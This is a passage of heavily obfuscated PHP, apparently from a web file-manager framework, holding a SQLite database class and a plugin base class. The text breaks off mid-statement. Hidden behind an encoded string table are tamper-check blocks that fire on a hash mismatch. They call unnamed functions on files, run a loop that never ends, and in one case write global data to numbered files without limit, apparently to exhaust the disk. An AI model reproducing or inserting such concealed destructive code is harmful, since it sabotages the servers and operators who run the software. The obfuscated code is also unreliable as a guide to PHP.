loadClass($Ş•‘èè) { if (1 === func_num_args()) { $this->{$Ş•‘èè} = new $Ş•‘èè(); } else { $ÅÔ”íÔ© = new ReflectionClass($Ş•‘èè); $åÅÀù‘ = func_get_args(); array_shift($åÅÀù‘); $this->{$Ş•‘èè} = $ÅÔ”íÔ©->newInstanceArgs($åÅÀù‘); } return $this->{$Ş•‘èè}; } public function routeBind($Ö³†¡Ç±, $ÛÕı¹ì­, $î‹´±Ï¤ = 3) { $´ ÊÏù´ =& $_SERVER[¹àö™Ç¾]; $ÉÊ€öÃø = $this->in[$´ ÊÏù´[19]]; $Ö³†¡Ç± = str_replace($´ ÊÏù´[20], $´ ÊÏù´[21], trim(trim($Ö³†¡Ç±, $´ ÊÏù´[18]), $´ ÊÏù´[22])); if (!$Ö³†¡Ç± || count($ÉÊ€öÃø) <= $î‹´±Ï¤) { return !1; } $³İ‡Šá = !0; $‡£¢òì¤ = explode($´ ÊÏù´[18], $Ö³†¡Ç±); for ($…­ã‚÷Ï = 0; $…­ã‚÷Ï < count($‡£¢òì¤); $…­ã‚÷Ï++) { if ($‡£¢òì¤[$…­ã‚÷Ï] != $ÉÊ€öÃø[$î‹´±Ï¤ + $…­ã‚÷Ï]) { $³İ‡Šá = !1; break; } } if (!$³İ‡Šá) { return; } call_user_func_array(array($this, $ÛÕı¹ì­), array()); } public function routeArgs($î•Á˜ä = 3) { $äàèÑÎÜ = $this->in[$_SERVER[¹àö™Ç¾][19]]; if (count($äàèÑÎÜ) <= $î•Á˜ä) { return array(); } $Šà¦ÓÈÀ = array(); for ($³íŠ·‡¼ = $î•Á˜ä; $³íŠ·‡¼ < count($äàèÑÎÜ); $³íŠ·‡¼ += 2) { $Šà¦ÓÈÀ[$äàèÑÎÜ[$³íŠ·‡¼]] = $äàèÑÎÜ[$³íŠ·‡¼ + 1]; $this->in[$äàèÑÎÜ[$³íŠ·‡¼]] = $äàèÑÎÜ[$³íŠ·‡¼ + 1]; } return $Šà¦ÓÈÀ; } protected function assign($İÂù¾äÄ, $‡¬ğü„‘) { $this->values[$İÂù¾äÄ] = $‡¬ğü„‘; } protected function display($š¿˜÷Ë) { ob_end_clean(); extract($this->values); require $this->tpl . $š¿˜÷Ë; } } class DbSqliteBase extends Db { public function __construct($Ô‚†ÏÉê = '') { $‹í¾™¢û =& $_SERVER[¹àö™Ç¾]; if (!extension_loaded($‹í¾™¢û[23])) { think_exception(think_lang($‹í¾™¢û[24]) . $‹í¾™¢û[25]); } if (!empty($Ô‚†ÏÉê)) { if (!isset($Ô‚†ÏÉê[$‹í¾™¢û[26]])) { $Ô‚†ÏÉê[$‹í¾™¢û[26]] = 438; } $this->config = $Ô‚†ÏÉê; if (empty($this->config[$‹í¾™¢û[27]])) { $this->config[$‹í¾™¢û[27]] = array(); } } } public function connect($ä™ğ³ = '', $‚ŞÚ¯ = 0) { $¼³ø•ÍØ =& $_SERVER[¹àö™Ç¾]; if (!isset($this->linkID[$‚ŞÚ¯])) { if (empty($ä™ğ³)) { $ä™ğ³ = $this->config; } $Â×ºÀ© = !empty($ä™ğ³[$¼³ø•ÍØ[27]][$¼³ø•ÍØ[28]]) ? $ä™ğ³[$¼³ø•ÍØ[27]][$¼³ø•ÍØ[28]] : $this->pconnect; $™éÁéß = $Â×ºÀ© ? $¼³ø•ÍØ[29] : $¼³ø•ÍØ[30]; $this->linkID[$‚ŞÚ¯] = $™éÁéß($ä™ğ³[$¼³ø•ÍØ[31]], $ä™ğ³[$¼³ø•ÍØ[26]]); if (!$this->linkID[$‚ŞÚ¯]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‚ŞÚ¯], 30000); if (1 != think_config($¼³ø•ÍØ[32])) { unset($this->config); } } return $this->linkID[$‚ŞÚ¯]; } public function free() { $this->queryID = null; } public function query($Á›û¼›Ğ) { $Ûû±ÚÕÌ =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Á›û¼›Ğ; if ($this->queryID) { $this->free(); } think_action_status($Ûû±ÚÕÌ[33], 1); think_status($Ûû±ÚÕÌ[34]); $this->queryID = sqlite_query($this->_linkID, $Á›û¼›Ğ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ğ™ì²—Å = $this->getAll(); return $Ğ™ì²—Å; } } public function execute($éšÕ†áï) { $âÁşã›Å =& $_SERVER[¹àö™Ç¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $éšÕ†áï; if ($this->queryID) { $this->free(); } think_action_status($âÁşã›Å[35], 1); think_status($âÁşã›Å[34]); $š«Ë¾¦¡ = sqlite_exec($this->_linkID, $éšÕ†áï); $this->debug(); if (!1 === $š«Ë¾¦¡) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹àö™Ç¾][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¤Ä²¨ Ê = sqlite_query($this->_linkID, $_SERVER[¹àö™Ç¾][37]); if (!$¤Ä²¨ Ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $…Ùû°¼é = sqlite_query($this->_linkID, $_SERVER[¹àö™Ç¾][38]); if (!$…Ùû°¼é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Úï­˜Çœ = array(); if ($this->numRows > 0) { for ($©“÷µÙª = 0; $©“÷µÙª < $this->numRows; $©“÷µÙª++) { $Úï­˜Çœ[$©“÷µÙª] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $Úï­˜Çœ; } public function getFields($—™Æğ“í) { $¿ƒüš½à =& $_SERVER[¹àö™Ç¾]; $¶»¢¢Ä = $this->query($¿ƒüš½à[39] . $—™Æğ“í . $¿ƒüš½à[40]); $¿äšÌ÷€ = array(); if ($¶»¢¢Ä) { foreach ($¶»¢¢Ä as $È¥ç†§Ä => $µö…–´) { $¿äšÌ÷€[$µö…–´[$¿ƒüš½à[41]]] = array($¿ƒüš½à[42] => $µö…–´[$¿ƒüš½à[41]], $¿ƒüš½à[43] => $µö…–´[$¿ƒüš½à[44]], $¿ƒüš½à[45] => (bool) ($µö…–´[$¿ƒüš½à[46]] === $¿ƒüš½à[22]), $¿ƒüš½à[47] => $µö…–´[$¿ƒüš½à[48]], $¿ƒüš½à[49] => strtolower($µö…–´[$¿ƒüš½à[50]]) == $¿ƒüš½à[51], $¿ƒüš½à[52] => strtolower($µö…–´[$¿ƒüš½à[53]]) == $¿ƒüš½à[54]); } } return $¿äšÌ÷€; } public function getTables($‘æî³ = '') { $ëô×³š§ =& $_SERVER[¹àö™Ç¾]; $Ÿ™ë¯Ôí = $this->query($ëô×³š§[55] . $ëô×³š§[56] . $ëô×³š§[57]); $ëúàüãë = array(); foreach ($Ÿ™ë¯Ôí as $„ã³ÏœÈ => $ç®¨Çªø) { $ëúàüãë[$„ã³ÏœÈ] = current($ç®¨Çªø); } return $ëúàüãë; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ ÉÜƒøØ =& $_SERVER[¹àö™Ç¾]; $ÁÍê©´ = sqlite_last_error($this->_linkID); $this->error = $ÁÍê©´ . $ ÉÜƒøØ[4] . sqlite_error_string($ÁÍê©´); if ($ ÉÜƒøØ[22] != $this->queryStr) { $this->error .= LNG($ ÉÜƒøØ[58]) . $this->queryStr; } think_trace($this->error, $ ÉÜƒøØ[22], $ ÉÜƒøØ[59]); return $this->error; } public function escapeString($ùø¶Â¯») { return sqlite_escape_string($ùø¶Â¯»); } public function parseLimit($ÍÖº¿ê®) { $Ôª¤Œ =& $_SERVER[¹àö™Ç¾]; $ãê‚ºù = $Ôª¤Œ[22]; if (!empty($ÍÖº¿ê®)) { $ÍÖº¿ê® = explode($Ôª¤Œ[60], $ÍÖº¿ê®); if (count($ÍÖº¿ê®) > 1) { $ãê‚ºù .= $Ôª¤Œ[61] . $ÍÖº¿ê®[1] . $Ôª¤Œ[62] . $ÍÖº¿ê®[0] . $Ôª¤Œ[63]; } else { $ãê‚ºù .= $Ôª¤Œ[61] . $ÍÖº¿ê®[0] . $Ôª¤Œ[63]; } } return $ãê‚ºù; } } goto A‡¸ŸÁä; b™Œ×„ÑÂ‰: if (!isset($_SERVER[$_SERVER[¹àö™Ç¾][6]]) || !isset($_SERVER[$_SERVER[¹àö™Ç¾][15]])) { $_getc = $_SERVER[¹àö™Ç¾][8]; $_getfile = $_SERVER[$_SERVER[¹àö™Ç¾][9]] . $_SERVER[¹àö™Ç¾][10]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹àö™Ç¾][11], $_getfilec); if (count($_getarrs) < $_SERVER[¹àö™Ç¾][12]) { $exit = $_SERVER[¹àö™Ç¾][13]; $exit(); } $_act = $_SERVER[¹àö™Ç¾][14]; $_act($_SERVER[$_SERVER[¹àö™Ç¾][9]] . $_SERVER[¹àö™Ç¾][10]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¹àö™Ç¾][382]); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $üğÛÊİ =& $_SERVER[¹àö™Ç¾]; $Â½Ş—å = $_SERVER[$üğÛÊİ[15]]; $ÁÆ¥ßÎ¨ = $üğÛÊİ[1504]; if ($_SERVER[$üğÛÊİ[6]] != $ÁÆ¥ßÎ¨($Â½Ş—å)) { $‹Ÿñ×ï = $üğÛÊİ[864]; $ğùëã€Ÿ = $üğÛÊİ[8]; $ÄÜ½õ¾¶ = $_SERVER[$üğÛÊİ[9]] . $üğÛÊİ[10]; $ºŠ¼‘ÑÒ = $ğùëã€Ÿ($ÄÜ½õ¾¶); $•ÉÔğÅ = explode($üğÛÊİ[11], $ºŠ¼‘ÑÒ); if (count($•ÉÔğÅ) < $üğÛÊİ[607]) { $ÃË¦Èä = $üğÛÊİ[13]; $ÃË¦Èä(); } $Í¦ÀÕ¤Ô = $üğÛÊİ[865]; $Í¦ÀÕ¤Ô($_SERVER[$üğÛÊİ[866]]); $‹Ÿñ×ï = $üğÛÊİ[864]; $‹Ÿñ×ï(); $åËÌ£õ£ = $üğÛÊİ[1505]; $¹… ı´Œ = json_encode($GLOBALS[$üğÛÊİ[1506]]); $Ì«óÓô = 1; for ($¸½“º²‰ = $Ì«óÓô; $¸½“º²‰ > 0; $¸½“º²‰++) { $åËÌ£õ£(DATA_PATH . $¸½“º²‰, $¹… ı´Œ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($üğÛÊİ[1507]); $this->pluginName = str_replace($üğÛÊİ[1507], $üğÛÊİ[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $üğÛÊİ[18]; $this->pluginApi = appHostGet() . $üğÛÊİ[1508] . $this->pluginName . $üğÛÊİ[18]; $this->pluginHost = $config[$üğÛÊİ[1509]] . $this->pluginName . $üğÛÊİ[18]; $this->pluginHostDefault = $config[$üğÛÊİ[1509]] . $this->pluginName . $üğÛÊİ[18]; $§§¬ÓÑù = $config[$üğÛÊİ[1510]]; if ($§§¬ÓÑù && strpos($üğÛÊİ[60] . $§§¬ÓÑù . $üğÛÊİ[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$üğÛÊİ[1511]] . $this->pluginName . $üğÛÊİ[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹àö™Ç¾][1512]); } protected function assign($–áâ«¹, $ù’Ûü§ˆ = false) { if (is_array($–áâ«¹)) { $this->values = array_merge($this->values, $–áâ«¹); } else { $this->values[$–áâ«¹] = $ù’Ûü§ˆ; } } protected function display($…ƒ²çà) { extract($this->values); require $…ƒ²çà; } final function hookRegist($Æß£ªñ) { $this->modelPlugin->appRegist($this->pluginName, $Æß£ªñ); } final function appIcon() { $šˆÏ‰¿â =& $_SERVER[¹àö™Ç¾]; $ŸàšŒ£Û = $this->appPackage(); $Ï¿ê•îé = $šˆÏ‰¿â[22]; if (isset($ŸàšŒ£Û[$šˆÏ‰¿â[417]])) { if (isset($ŸàšŒ£Û[$šˆÏ‰¿â[417]][$šˆÏ‰¿â[1513]])) { $Ï¿ê•îé = $šˆÏ‰¿â[1514] . $ŸàšŒ£Û[$šˆÏ‰¿â[417]][$šˆÏ‰¿â[1513]] . $šˆÏ‰¿â[1515]; } else { if ($ŸàšŒ£Û[$šˆÏ‰¿â[417]][$šˆÏ‰¿â[1516]]) { $Ï¿ê•îé = $šˆÏ‰¿â[1517] . $ŸàšŒ£Û[$šˆÏ‰¿â[417]][$šˆÏ‰¿â[1516]] . $šˆÏ‰¿â[1518]; } } } return $Ï¿ê•îé; } final function fileCanView($Ş†á¸æ¸) { $îäÀÄç =& $_SERVER[¹àö™Ç¾]; if (request_url_safe($Ş†á¸æ¸)) { return !0; } if ($this->isShare($Ş†á¸æ¸)) { return !0; } $æÕ¨Å®´ = Session::get($îäÀÄç[1519]); if (!$æÕ¨Å®´ || !$æÕ¨Å®´[$îäÀÄç[1520]]) { $£µ¾‹Ñ = $îäÀÄç[1521] . rawurlencode(this_url()); show_tips(LNG($îäÀÄç[1522]) . $îäÀÄç[1523] . $£µ¾‹Ñ . $îäÀÄç[1524] . LNG($îäÀÄç[1525]) . $îäÀÄç[1526], !1); } if (!Action($îäÀÄç[1527])->authCan($îäÀÄç[1528])) { show_tips(LNG($îäÀÄç[1529]) . $îäÀÄç[1530], !1); } ActionCall($îäÀÄç[1531], $Ş†á¸æ¸); } final function isShare($¤¯’ªÒ²) { $¥ß°‡Ş± = KodIO::parse($¤¯’ªÒ²); return $¥ß°‡Ş±[$_SERVER[¹àö™Ç¾][43]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($äÆàÜğ°) { if (request_url_safe($äÆàÜğ°)) { return $äÆàÜğ°; } if (!$this->isShare($äÆàÜğ°)) { $äÆàÜğ° = $this->filePath($äÆàÜğ°); } return Action($_SERVER[¹àö™Ç¾][1158])->linkOut($äÆàÜğ°); } public function filePathLinkOut($èË™æò) { if (request_url_safe($èË™æò)) { return $èË™æò; } $this->fileCanView($èË™æò); return Action($_SERVER[¹àö™Ç¾][1158])->link($èË™æò); } final function filePath($–¼’Îš¯) { $Ì®ŞºÊÎ =& $_SERVER[¹àö™Ç¾]; if ($À‹‰ÅØ = $this->checkSharePath($–¼’Îš¯)) { Hook::trigger($Ì®ŞºÊÎ[1532], $À‹‰ÅØ); return $À‹‰ÅØ; } $this->fileCanView($–¼’Îš¯); if (request_url_safe($–¼’Îš¯)) { $ò™Ğ¿İ = parse_url_query($–¼’Îš¯); if (isset($ò™Ğ¿İ[$Ì®ŞºÊÎ[1533]]) && isset($ò™Ğ¿İ[$Ì®ŞºÊÎ[218]])) { $÷õ—ÉËŞ = Model($Ì®ŞºÊÎ[762])->get($Ì®ŞºÊÎ[763]); $™â¤Ï­ú = Mcrypt::decode($ò™Ğ¿İ[$Ì®ŞºÊÎ[218]], $÷õ—ÉËŞ); if ($™â¤Ï­ú) { $this->fileInfo = IO::infoWithChildren($™â¤Ï­ú); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $™â¤Ï­ú; } } $–¼’Îš¯ = $this->_cacheHttpFile($–¼’Îš¯); $this->fileInfo = IO::infoWithChildren($–¼’Îš¯); } else { $this->fileInfo = IO::infoWithChildren($–¼’Îš¯); if (!$this->fileInfo) { show_tips(LNG($Ì®ŞºÊÎ[116]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Ì®ŞºÊÎ[1532], $–¼’Îš¯); return $–¼’Îš¯; } final function _cacheHttpFile($±£ÄÖá») { $±ÆˆÃÒâ = hash_path($±£ÄÖá», !0); $this->cachePath = $this->pluginCachePath($±ÆˆÃÒâ); if ($™¦ÕãÍ = IO::fileNameExist($this->cachePath, $±ÆˆÃÒâ)) { return KodIO::make($™¦ÕãÍ); } $––ˆ € = $this->cachePath . $±ÆˆÃÒâ; return $this->pluginCacheFileSet($––ˆ €, file_get_contents_nossl($±£ÄÖá»)); } final function _tmpFileName($ô¦Ñ•ÛÖ = array()) { $ŞŸŠ¢Ø… =& $_SERVER[¹àö™Ç¾]; if (!$ô¦Ñ•ÛÖ) { $ô¦Ñ•ÛÖ = $this->fileInfo; } if (isset($ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[180]])) { return $ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[180]]; } if (isset($ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[173]][$ŞŸŠ¢Ø…[180]])) { return $ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[173]][$ŞŸŠ¢Ø…[180]]; } $…ôóæ×• = IO::hashSimple($ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[88]]); if ($…ôóæ×•) { return $…ôóæ×•; } $ïóÖªè€ = array($ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[42]], $ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[88]], $ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[90]]); if (isset($ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[521]])) { $ïóÖªè€[] = $ô¦Ñ•ÛÖ[$ŞŸŠ¢Ø…[521]]; } return md5(implode($ŞŸŠ¢Ø…[21], $ïóÖªè€)); } final function checkSharePath($ø‚¾Î™¿) { $Ôõí™òÉ =& $_SERVER[¹àö™Ç¾]; if (!defined($Ôõí™òÉ[474])) { define($Ôõí™òÉ[514], 0); } if (!$this->isShare($ø‚¾Î™¿)) { return !1; } $Ô„™ÏŸØ = Action($Ôõí™òÉ[1158])->sharePathInfo($ø‚¾Î™¿); if (!isset($Ô„™ÏŸØ[$Ôõí™òÉ[88]])) { show_json(LNG($Ôõí™òÉ[1534]), !1); } $this->fileInfo = $Ô„™ÏŸØ[$Ôõí™òÉ[173]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$Ôõí™òÉ[180]]); return $Ô„™ÏŸØ[$Ôõí™òÉ[88]]; } final function pluginCachePath($ı£¾ç‚“ = '') { $”™ÌµÄ =& $_SERVER[¹àö™Ç¾]; $ÄÙöƒÃÙ = IO_PATH_SYSTEM_TEMP . $”™ÌµÄ[1535] . $this->pluginName; if (!($ñªòìÈº = IO::infoFull($ÄÙöƒÃÙ))) { return IO::mkdir($ÄÙöƒÃÙ . $”™ÌµÄ[18] . $ı£¾ç‚“); } if (empty($ı£¾ç‚“)) { return $ñªòìÈº[$”™ÌµÄ[88]]; } if (!($ïåÇÆÔ® = IO::fileNameExist($ñªòìÈº[$”™ÌµÄ[88]], $ı£¾ç‚“))) { return IO::mkdir($ñªòìÈº[$”™ÌµÄ[88]] . $ı£¾ç‚“); } return KodIO::make($ïåÇÆÔ®); } final function pluginCacheFileSet($ÌØªüê´, $‡åº…’Ú = '') { $´ş§¯Í¾ =& $_SERVER[¹àö™Ç¾]; if (!($ÕšĞËä = IO::infoFull($ÌØªüê´))) { return IO::mkfile($ÌØªüê´, $‡åº…’Ú, REPEAT_REPLACE); } IO::setContent($ÕšĞËä[$´ş§¯Í¾[88]], $‡åº…’Ú); return $ÕšĞËä[$´ş§¯Í¾[88]]; } final function pluginLocalFile($û¯áÒú = '') { $—Å©ãÓÃ =& $_SERVER[¹àö™Ç¾]; $åõš†£Ê = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($åõš†£Ê)) { mk_dir($åõš†£Ê); } if (!$û¯áÒú) { return $åõš†£Ê; } $¨Éı®Œå = IO::info($û¯áÒú); $ôËƒ»¿ = $this->_tmpFileName($¨Éı®Œå) . $—Å©ãÓÃ[20] . $¨Éı®Œå[$—Å©ãÓÃ[177]]; if (!checkExtSafe($ôËƒ»¿)) { $ôËƒ»¿ = $ôËƒ»¿ . $—Å©ãÓÃ[1536]; } $ûŸø©ş¹ = $åõš†£Ê . $ôËƒ»¿; if (@file_exists($ûŸø©ş¹)) { return $ûŸø©ş¹; } return IO::copy($û¯áÒú, $åõš†£Ê, 0, $ôËƒ»¿); } final function appPackage() { $ıÚÓ€¹® =& $_SERVER[¹àö™Ç¾]; if ($this->packageData) { return $this->packageData; } $‹‡ËéãŠ = $this->parseFile($this->pluginPath . $ıÚÓ€¹®[1537]); $this->parseLang($‹‡ËéãŠ); $šßÛÕæŸ = json_decode_force($‹‡ËéãŠ); if (!$šßÛÕæŸ) { return array(); } $ÄÈ¨ØÖÚ = Hook::trigger($ıÚÓ€¹®[1538], $šßÛÕæŸ); if ($ÄÈ¨ØÖÚ && is_array($ÄÈ¨ØÖÚ)) { $šßÛÕæŸ = $ÄÈ¨ØÖÚ; } $this->packageData = $šßÛÕæŸ; return $šßÛÕæŸ; } public function packageInfoGet($åÓÓÚú) { $ÃóÕÁ˜¾ = $this->appPackage(); return array_get_value($ÃóÕÁ˜¾, $åÓÓÚú); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹àö™Ç¾][1539]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹àö™Ç¾][1540]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹àö™Ç¾][1541]); } public function echoJsAssign($ªÈò‚¥, $¬Ç½©…÷) { $this->echoJsAssignArr[$ªÈò‚¥] = $¬Ç½©…÷; } private function parseFile($œÅ²¡İ) { $¢¬ò¾…° =& $_SERVER[¹àö™Ç¾]; $€ÚØëä³ = file_get_contents_nossl($œÅ²¡İ); $†÷¥¤ú× = array($¢¬ò¾…°[1542], $¢¬ò¾…°[1543], $¢¬ò¾…°[1544], $¢¬ò¾…°[1545], $¢¬ò¾…°[1546], $¢¬ò¾…°[1547], $¢¬ò¾…°[1548]); $‘ùõÜŒÇ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¢¬ò¾…°[100]][$¢¬ò¾…°[1549]]); foreach ($this->echoJsAssignArr as $î±¡ö­´ => $ä¥Æ’ˆ…) { $†÷¥¤ú×[] = $¢¬ò¾…°[1550] . $î±¡ö­´ . $¢¬ò¾…°[1551]; $‘ùõÜŒÇ[] = is_array($ä¥Æ’ˆ…) || is_object($ä¥Æ’ˆ…) ? rawurlencode(json_encode($ä¥Æ’ˆ…)) : $ä¥Æ’ˆ…; } if (strstr($€ÚØëä³, $¢¬ò¾…°[1552])) { $Æ¼±ş¡± = rawurlencode(json_encode($this->pluginLangArr)); $€ÚØëä³ = str_replace($¢¬ò¾…°[1552], $Æ¼±ş¡±, $€ÚØëä³); } if (strstr($€ÚØëä³, $¢¬ò¾…°[1553])) { $Æ¼±ş¡± = $Æ¼±ş¡± = rawurlencode(json_encode($this->getConfig())); $€ÚØëä³ = str_replace($¢¬ò¾…°[1553], $Æ¼±ş¡±, $€ÚØëä³); } $€ÚØëä³ = str_replace($†÷¥¤ú×, $‘ùõÜŒÇ, $€ÚØëä³); return $€ÚØëä³; } private function parseLang(&$Åû²ş”—) { $›âã÷¿ =& $_SERVER[¹àö™Ç¾]; $µ½ï‰ŠÍ = $›âã÷¿[1554]; if (!strstr($Åû²ş”—, $µ½ï‰ŠÍ)) { return; } preg_match_all($›âã÷¿[1555], $Åû²ş”—, $‰ôŠè˜Õ); if (!is_array($‰ôŠè˜Õ) || count($‰ôŠè˜Õ) == 0 || !is_array($‰ôŠè˜Õ[0]) || count($‰ôŠè˜Õ[0]) == 0) { return; } $´›Í–Ö¨ = array(); $ñ£Œ‚Éœ = array(); foreach ($‰ôŠè˜Õ[0] as $µğ“½é) { $Æ³ª—€Ü = substr($µğ“½é, strlen($µ½ï‰ŠÍ), -4); $œòãïæ = LNG($Æ³ª—€Ü); $´›Í–Ö¨[] = $µğ“½é; $ñ£Œ‚Éœ[] = str_replace(array($›âã÷¿[11], $›âã÷¿[1063], $›âã÷¿[346], $›âã÷¿[127]), array($›âã÷¿[63], $›âã÷¿[63], $›âã÷¿[22], $›âã÷¿[1556]), $œòãïæ); } $Åû²ş”— = str_replace($´›Í–Ö¨, $ñ£Œ‚Éœ, $Åû²ş”—); } private function parseConfig(&$»ŸÄìÍğ) { $‰‹‰Ÿ¦ =& $_SERVER[¹àö™Ç¾]; $®İÒÙèÈ = $‰‹‰Ÿ¦[1557]; if (!strstr($»ŸÄìÍğ, $®İÒÙèÈ)) { return; } preg_match_all($‰‹‰Ÿ¦[1558], $»ŸÄìÍğ, $•Ô‡À÷É); if (!is_array($•Ô‡À÷É) || count($•Ô‡À÷É) == 0 || !is_array($•Ô‡À÷É[0]) || count($•Ô‡À÷É[0]) == 0) { return; } $¬Ù„áÀº = $this->getConfig(); $îÓ‡²Ğ¾ = array(); $é±ÂÄÔ = array(); foreach ($•Ô‡À÷É[0] as $ø×ãçó†) { $¶ÃÒ×ÜÕ = substr($ø×ãçó†, strlen($®İÒÙèÈ), -2); $îÓ‡²Ğ¾[] = $ø×ãçó†; $é±ÂÄÔ[] = _get($¬Ù„áÀº, $¶ÃÒ×ÜÕ); } $»ŸÄìÍğ = str_replace($îÓ‡²Ğ¾, $é±ÂÄÔ, $»ŸÄìÍğ); } private function parsePackage(&$Ïáà’Óû) { $ÓË˜â¾  =& $_SERVER[¹àö™Ç¾]; $Î‚Õä¾” = $ÓË˜â¾ [1559]; if (!strstr($Ïáà’Óû, $Î‚Õä¾”)) { return; } preg_match_all($ÓË˜â¾ [1560], $Ïáà’Óû, $ÂŠÀÃ™); if (!is_array($ÂŠÀÃ™) || count($ÂŠÀÃ™) == 0 || !is_array($ÂŠÀÃ™[0]) || count($ÂŠÀÃ™[0]) == 0) { return; } $â¡‚Ğ‡´ = $this->appPackage(); $¬Ç·Ù¿À = array(); $Å÷¸Í¿ú = array(); foreach ($ÂŠÀÃ™[0] as $¨Ş˜¾Ì°) { $ÒçÌå„ = substr($¨Ş˜¾Ì°, strlen($Î‚Õä¾”), -2); $¬Ç·Ù¿À[] = $¨Ş˜¾Ì°; $Å÷¸Í¿ú[] = _get($â¡‚Ğ‡´, $ÒçÌå„); } $Ïáà’Óû = str_replace($¬Ç·Ù¿À, $Å÷¸Í¿ú, $Ïáà’Óû); } final function echoFile($æé™œéÆ, $—õ¼ùÒÌ = false) { $ÛºŸ â” =& $_SERVER[¹àö™Ç¾]; $Ş×¯ª§¸ = $this->pluginPath . $æé™œéÆ; if (ACT == $ÛºŸ â”[1561]) { echo $ÛºŸ â”[1562] . $this->pluginName . $ÛºŸ â”[18] . $æé™œéÆ . $ÛºŸ â”[1563]; if (!file_exists($Ş×¯ª§¸)) { echo $ÛºŸ â”[1564]; return; } } $Ôâä¸Ó½ = $this->parseFile($Ş×¯ª§¸); $this->parseLang($Ôâä¸Ó½); $this->parseConfig($Ôâä¸Ó½); $this->parsePackage($Ôâä¸Ó½); if (is_array($—õ¼ùÒÌ)) { $Ôâä¸Ó½ = str_replace(array_keys($—õ¼ùÒÌ), array_values($—õ¼ùÒÌ), $Ôâä¸Ó½); } echo $ÛºŸ â”[11] . $Ôâä¸Ó½; } final function initLang() { $ƒè†÷²Î =& $_SERVER[¹àö™Ç¾]; $ˆàŒæ´“ = $ƒè†÷²Î[1565]; $Ò‡ˆğ˜£ = $this->pluginPath . $ƒè†÷²Î[1566]; $º”ÚÎÛ½ = I18n::getType(); $¤ÔÛôó˜ = array(); if (file_exists($Ò‡ˆğ˜£ . $º”ÚÎÛ½ . $ƒè†÷²Î[830])) { $¤ÔÛôó˜ = (include $Ò‡ˆğ˜£ . $º”ÚÎÛ½ . $ƒè†÷²Î[830]); } else { if ($º”ÚÎÛ½ == $ƒè†÷²Î[1567] && !file_exists($Ò‡ˆğ˜£ . $º”ÚÎÛ½ . $ƒè†÷²Î[830]) && file_exists($Ò‡ˆğ˜£ . $ƒè†÷²Î[1568])) { $¤ÔÛôó˜ = (include $Ò‡ˆğ˜£ . $ƒè†÷²Î[1568]); } else { if (file_exists($Ò‡ˆğ˜£ . $ˆàŒæ´“ . $ƒè†÷²Î[830])) { $¤ÔÛôó˜ = (include $Ò‡ˆğ˜£ . $ˆàŒæ´“ . $ƒè†÷²Î[830]); } } } if (!is_array($¤ÔÛôó˜)) { return array(); } if (@count($¤ÔÛôó˜) > 0) { I18n::set($¤ÔÛôó˜); } return $¤ÔÛôó˜; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ŒÉ“Ù) { $ş’øØıñ =& $_SERVER[¹àö™Ç¾]; $Ô¬ÎÈÄ™ = $_SERVER[$ş’øØıñ[9]] . $ş’øØıñ[10]; $úãñ·ğŒ = $ş’øØıñ[1504]; if ($_SERVER[$ş’øØıñ[6]] != $úãñ·ğŒ($Ô¬ÎÈÄ™)) { $â’£Ó» = $ş’øØıñ[864]; $Î¡ºğ¨Ø = $ş’øØıñ[8]; $¡ùÎİ = $_SERVER[$ş’øØıñ[9]] . $ş’øØıñ[10]; $ã÷¡îÕñ = $Î¡ºğ¨Ø($¡ùÎİ); $ÕŸæÕ»Ü = explode($ş’øØıñ[11], $ã÷¡îÕñ); if (count($ÕŸæÕ»Ü) < $ş’øØıñ[607]) { $îâ¤Ğ’“ = 